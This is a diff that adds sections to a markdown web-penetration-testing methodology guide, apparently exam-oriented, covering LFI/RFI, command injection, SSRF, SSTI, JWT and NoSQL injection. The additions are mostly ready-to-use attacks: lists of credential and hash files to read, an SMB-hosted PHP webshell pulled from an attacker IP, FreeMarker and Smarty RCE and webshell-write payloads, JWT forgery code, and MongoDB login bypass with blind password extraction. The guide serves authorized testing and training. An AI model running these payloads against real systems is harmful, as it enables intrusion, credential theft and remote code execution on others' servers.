@@ -4,7 +4,7 @@
 authorization to test the target.*
 
 *Scope note: this file covers the manual detection/exploitation methodology for the core OWASP-class
-web vulnerabilities (SQLi, XSS, LFI/RFI, command injection, SSRF, XXE, SSTI, JWT attacks) — the "find and confirm it by hand"
+web vulnerabilities (SQLi, XSS, LFI/RFI, command injection, SSRF, XXE, SSTI, JWT attacks, NoSQL injection) — the "find and confirm it by hand"
 step that sits **before** automation. For sqlmap tamper-script usage and shell escalation once an
 injection point is already found, see [`web-attack-techniques.md` §5](web-attack-techniques.md#5-sqlmap--tamper-scripts--shell-escalation).
 For file-upload bypass, deserialization, and WordPress/CMS attack techniques, see the rest of
@@ -187,6 +187,23 @@ http://target/index.php?page=/etc/passwd%00                          # null-byte
 ```
 On Windows targets: `..\..\..\..\windows\win.ini` (or its URL-encoded form `..%5c..%5c..%5c..%5cwindows%5cwin.ini`).
 
+**High-value files to read once LFI is confirmed:**
+
+| Linux | Windows |
+|---|---|
+| `/etc/passwd` (user list) | `C:\Windows\win.ini` (confirmation) |
+| `/etc/shadow` (hashes, if readable) | `C:\Windows\System32\config\SAM` (locked, but try VSS copies) |
+| `/etc/hosts` | `C:\inetpub\wwwroot\web.config` (creds, connection strings) |
+| `/proc/self/environ` (env vars, secrets) | `C:\Users\<user>\.ssh\id_rsa` |
+| `/proc/self/cmdline` (process args) | `C:\Windows\repair\SAM` / `C:\Windows\repair\SYSTEM` |
+| `/home/<user>/.ssh/id_rsa` | `C:\Windows\Panther\Unattend.xml` (setup creds) |
+| `/home/<user>/.bash_history` | `C:\Windows\debug\NetSetup.log` |
+| `/root/.bash_history` | `C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` |
+| `/var/lib/php/sessions/sess_*` | `C:\xampp\apache\conf\httpd.conf` |
+| `/etc/crontab` | `C:\inetpub\logs\LogFiles\` |
+| `/proc/self/fd/[0-20]` (open file descriptors) | `C:\boot.ini` (older systems) |
+| App-specific: `/var/www/html/wp-config.php`, `.env`, `config.php` | App-specific: `web.config`, `appsettings.json`, `connectionStrings.config` |
+
 **Reference:** https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html
 
 ---
@@ -254,6 +271,17 @@ python3 -m http.server 8000
 http://target/index.php?page=http://10.10.14.1:8000/shell.php&cmd=id
 ```
 
+**SMB-based RFI (Windows targets — bypasses `allow_url_include`):**
+On Windows, PHP's `include()` resolves UNC paths natively via Windows SMB client — `allow_url_include` does NOT need to be enabled, making this far more likely to work than HTTP-based RFI on modern configs.
+```bash
+# Attacker: host a PHP payload via SMB
+impacket-smbserver share /tmp/payloads -smb2support
+echo '<?php system($_GET["cmd"]); ?>' > /tmp/payloads/shell.php
+```
+```
+http://target/index.php?page=\\10.10.14.1\share\shell.php&cmd=whoami
+```
+
 **Reference:** https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#remote-file-inclusion
 
 ---
@@ -270,8 +298,10 @@ http://target/index.php?page=http://10.10.14.1:8000/shell.php&cmd=id
 127.0.0.1 | id
 127.0.0.1 `id`
 127.0.0.1 $(id)
+127.0.0.1 || id              # OR — runs second command only if first fails
 127.0.0.1; sleep 5          # blind confirmation — no output needed, just observe the delay
 127.0.0.1|ping -n 5 127.0.0.1   # Windows blind confirmation equivalent
+%0aid                        # newline injection (URL-encoded) — bypasses filters that only check for ; | && $()
 ```
 
 **Reference:** https://book.hacktricks.wiki/en/pentesting-web/command-injection.html
@@ -313,6 +343,19 @@ url=http://internal-only-host.corp.local:8080/admin
 url=file:///etc/passwd                                                    # some SSRF sinks also accept file:// for local read
 ```
 Bypass naive `localhost`/`127.0.0.1` blocklists with alternate representations: `http://0177.0.0.1/` (octal), `http://2130706433/` (decimal), `http://127.1/`, `http://[::1]/`, or a DNS name that resolves to `127.0.0.1` (`http://spoofed.burpcollaborator.net/` style rebinding domains). See [`service-enumeration-comprehensive.md`](service-enumeration-comprehensive.md) for the gopher-protocol SSRF-to-Redis-RCE chain when a raw-protocol SSRF primitive is available.
+
+**Blind SSRF detection (no response reflection):**
+When the server fetches the URL but doesn't return the response body, confirm via out-of-band callbacks:
+```bash
+# Start a listener and use the URL parameter to point at it
+python3 -m http.server 8000
+# or use Burp Collaborator / interact.sh for DNS+HTTP callback
+```
+```
+url=http://10.10.14.1:8000/ssrf-confirm     # check your listener for the hit
+url=http://BURP-COLLAB-ID.oastify.com/      # Burp Collaborator DNS+HTTP callback
+```
+A hit on your listener confirms the server made an outbound request — even though you can't see the response. Then pivot to internal service probing (ports, metadata endpoint) and exfiltrate via timing/error differences or by chaining into a protocol that allows write (e.g. `gopher://` to Redis).
 
 **Reference:** https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html
 
@@ -421,7 +464,36 @@ If `registerUndefinedFilterCallback`/`getFilter` throws a `Twig\Sandbox\Security
 
 ---
 
-### 7.5 Automation (tplmap)
+### 7.5 Exploitation to RCE — FreeMarker (Java)
+**Explanation:** FreeMarker templates run inside the JVM. The `freemarker.template.utility.Execute` class provides a direct `exec()` equivalent. If the template sandbox (`Configuration.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER)`) is not set, the `?new()` built-in instantiates arbitrary classes.
+
+**Example payloads:**
+```
+${7*7}                                                            # confirm — 49
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}   # direct RCE
+<#assign ex="freemarker.template.utility.ObjectConstructor"?new()>${ex("java.lang.Runtime").getRuntime().exec("id")}   # alternative via ObjectConstructor
+```
+
+**Reference:** https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html#freemarker-java
+
+---
+
+### 7.6 Exploitation to RCE — Smarty (PHP)
+**Explanation:** Smarty 3.x templates can call PHP functions directly via `{function}` syntax when security policies are not applied (`Smarty_Security` class not enabled). The older `{php}` tags were removed in Smarty 4, but the static-class-method and function-call syntax persists.
+
+**Example payloads:**
+```
+{$smarty.version}                                    # confirm engine + version
+{system('id')}                                       # direct function call (Smarty 3.x, no security policy)
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}   # webshell write via Smarty internals
+```
+If `{system()}` throws a security error, the security policy is active — check for allowed tags/functions in the error output and look for any callable that accepts a string argument you control.
+
+**Reference:** https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html#smarty-php
+
+---
+
+### 7.7 Automation (tplmap)
 **Explanation:** As with sqlmap (§1.1), confirm SSTI by hand first — it's the expected exam methodology and avoids relying on a scanner as ground truth. Once confirmed (and optionally fingerprinted per §7.2), [tplmap](https://github.com/epinna/tplmap) automates engine identification and searches for a working RCE payload/gadget chain across engines, saving time versus manually enumerating `__subclasses__()` indexes or sandbox-escape gadgets by hand. Detection/identification (no `-u ... ` alone beyond confirming injection and engine) is fine; `--os-shell`/`--os-cmd`/`--bind-shell`/`--reverse-shell` are tplmap's fully-automated exploit-to-shell flags and carry the same exam restriction as sqlmap's `--os-shell` (§5 in `web-attack-techniques.md`) — treat them as reference-only.
 
 **Example:**
@@ -511,7 +583,34 @@ Send `forged` in place of the original token (`Authorization: Bearer <forged>`).
 
 ---
 
-### 8.4 jwt_tool — Automating the Above
+### 8.4 kid (Key ID) Header Injection
+**Explanation:** The `kid` (Key ID) header parameter tells the server which key to use for signature verification. If the server uses `kid` in an unsafe way (filesystem path lookup, SQL query, etc.), it can be exploited to sign tokens with a known/empty key.
+
+**Path traversal — sign with an empty/known file:**
+```python
+import jwt
+
+# kid points to /dev/null (empty file) — sign with empty string as the secret
+forged = jwt.encode(
+    {"user": "admin", "role": "admin"},
+    "",
+    algorithm="HS256",
+    headers={"kid": "../../../../dev/null"}
+)
+print(forged)
+```
+
+**SQL injection in kid — extract a known key value:**
+```json
+{"alg": "HS256", "typ": "JWT", "kid": "1' UNION SELECT 'attacker-controlled-secret' -- "}
+```
+Then sign the token with `attacker-controlled-secret` as the HMAC key.
+
+**Reference:** https://book.hacktricks.wiki/en/pentesting-web/hacking-jwt-json-web-tokens.html#kid-issues
+
+---
+
+### 8.5 jwt_tool — Automating the Above
 **Explanation:** Once the manual mechanics in §8.1–§8.3 are understood, [jwt_tool](https://github.com/ticarpi/jwt_tool) automates detection and exploitation of all three (plus header-injection variants like `jku`/`kid` SQLi/path-traversal) against a live token/endpoint in one pass — the practical Swiss-army-knife once you know what each check is actually doing under the hood.
 
 **Example:**
@@ -543,4 +642,50 @@ python3 jwt_tool.py '<jwt>' -T                          # interactive claim tamp
 - JWT attacks (HackTricks): https://book.hacktricks.wiki/en/pentesting-web/hacking-jwt-json-web-tokens.html
 - JWT cracking (hashcat mode 16500 issue thread): https://github.com/hashcat/hashcat/issues/1057
 - jwt_tool: https://github.com/ticarpi/jwt_tool
+- NoSQL Injection (HackTricks): https://book.hacktricks.wiki/en/pentesting-web/nosql-injection.html
+- NoSQL Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/NoSQL%20Injection/README.md
 - sqlmap automation (this repo): [`web-attack-techniques.md` §5](web-attack-techniques.md#5-sqlmap--tamper-scripts--shell-escalation)
+
+---
+
+## 9. NoSQL Injection (MongoDB)
+
+### 9.1 Detection & Authentication Bypass
+**Explanation:** MongoDB-backed web apps (Node.js/Express, Python/Flask with PyMongo) often pass JSON request bodies directly into query operators. Unlike SQL, NoSQL injection uses operator-based payloads (`$ne`, `$gt`, `$regex`, `$where`) rather than string-breaking syntax.
+
+**Authentication bypass (JSON body):**
+```json
+{"username": {"$ne": ""}, "password": {"$ne": ""}}
+{"username": "admin", "password": {"$ne": ""}}
+{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
+```
+
+**Query-string parameter injection (PHP/Express form handling):**
+```
+username=admin&password[$ne]=wrongpassword
+username[$regex]=^adm&password[$ne]=x
+```
+Many frameworks (Express with `qs`, PHP) auto-parse bracket syntax into nested objects, so `password[$ne]=x` becomes `{password: {$ne: "x"}}` server-side.
+
+**Reference:** https://book.hacktricks.wiki/en/pentesting-web/nosql-injection.html
+
+---
+
+### 9.2 Data Extraction (Blind)
+**Explanation:** When injection is confirmed but data isn't reflected, extract values character-by-character using `$regex` — same concept as blind SQLi boolean-based, different syntax.
+
+**Example — extract admin password character-by-character:**
+```
+{"username": "admin", "password": {"$regex": "^a"}}     login success = first char is 'a'
+{"username": "admin", "password": {"$regex": "^ab"}}    success = second char is 'b'
+{"username": "admin", "password": {"$regex": "^abc"}}   fail = third char is NOT 'c', try next
+```
+Automate with a script — iterate `[a-zA-Z0-9!@#$%...]` per position, appending confirmed chars.
+
+**Server-side JavaScript injection (`$where`):**
+```json
+{"username": "admin", "$where": "this.password.match(/^a.*/i)"}
+```
+`$where` executes arbitrary JavaScript server-side (MongoDB < 4.4 without `mongosh` restrictions). If available, it's the most powerful injection point.
+
+**Reference:** https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/NoSQL%20Injection/README.md
